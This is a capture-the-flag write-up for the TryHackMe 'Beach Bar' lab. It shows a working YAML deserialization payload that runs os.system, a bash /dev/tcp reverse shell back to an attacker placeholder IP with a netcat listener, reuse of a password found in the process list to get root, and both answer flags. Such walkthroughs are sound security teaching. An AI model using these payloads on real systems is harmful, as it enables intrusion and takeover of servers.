# [Beach Bar](https://tryhackme.com/room/hh-beachbar-d849f7f7)

- start up the Attacker machine and the Lab machine
- will get a Lab machine IP: `<lab-machine-ip>`

## recon

- in the attack box check the `<lab-machine-ip>` in the browser
- it should give a website login page
- check the source of the webpage
- will find credentials to log in in comments: `dj:dj`
- log in
- there is a section where you can import/export `.yml` files
- go to the import and paste the following:

```yml
!!python/object/apply:os.system ["id"]
```

- `!!python/object/apply:` -> "run a Python function"
- `os.system` -> the function to run (runs a shell command)
- `["id"]` -> the argument passed in (the command id)
- what essentially is `os.system("id")`
- it should return `0`
- this means the `.yml` file is loaded in an unsafe way (`yaml.load()`), what runs the Linux command `id` on the server

## reverse shell

- start a listener on the attack machine:

```
nc -lnvp 4444
```

---

- `nc` -> netcat
- `-l` -> listen
- `-v` -> verbose (show connection info)
- `-n` -> don't resolve DNS
- `-p 4444` -> listen on port 4444
- this starts to listen on port 4444

---

- add the following to the `.yml` import:

```yml
!!python/object/apply:os.system ["bash -c 'bash -i >& /dev/tcp/<attack-machine-ip>/4444 0>&1'"]
```

---

- `bash -c '...'` -> runs the quoted content as a bash command
- `bash -i` -> start an interactive bash shell
- `>&` -> sends both normal output and error output through that connection
- `/dev/tcp/` -> open network connections through `/dev/tcp/`
- `<attack-machine-ip>/4444` -> connects to `<attack-machine-ip>:4444`
- `0>&1` -> sends attacker input through that same connection
- this opens a reverse shell where input, output, and errors all flow over the network

---

- in the listener should have access to the bartender user

## get user flag

- go to the user folder: `cd ~`
- list the files: `ls`
- check the `user.txt` file: `cat user.txt`

> What is the user flag?

```
THM{y4ml_pl4yl1st_pwns_th3_b34ch}
```

## get root flag

- list the processes looking for **jukebox**:

```
ps aux | grep jukebox
```

- it should have a line with:

```bash
... --stream-pass SunsetSpritz2024! ...
```

- might be the password for **root**
- to log in `su` needs a real terminal (`TTY`) to work properly add the following:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

- `python3 -c '...'` -> Runs Python, `-c` means "run this code directly" instead of from a file
- `import pty` -> Loads Python's pty module, `pty` stands for pseudo-terminal, this module can create a fake, but fully working, terminal
- `pty.spawn("/bin/bash")` -> `spawn` starts a new process, `"/bin/bash"` the program to start
- opens a proper terminal so `su` works

---

- then type: `su`
- add the password
- should be logged in as **root**
- go to **root** home: `cd ~`
- list the files: `ls`
- check the `root.txt` file: `cat root.txt`

> What is the root flag?

```
THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
```
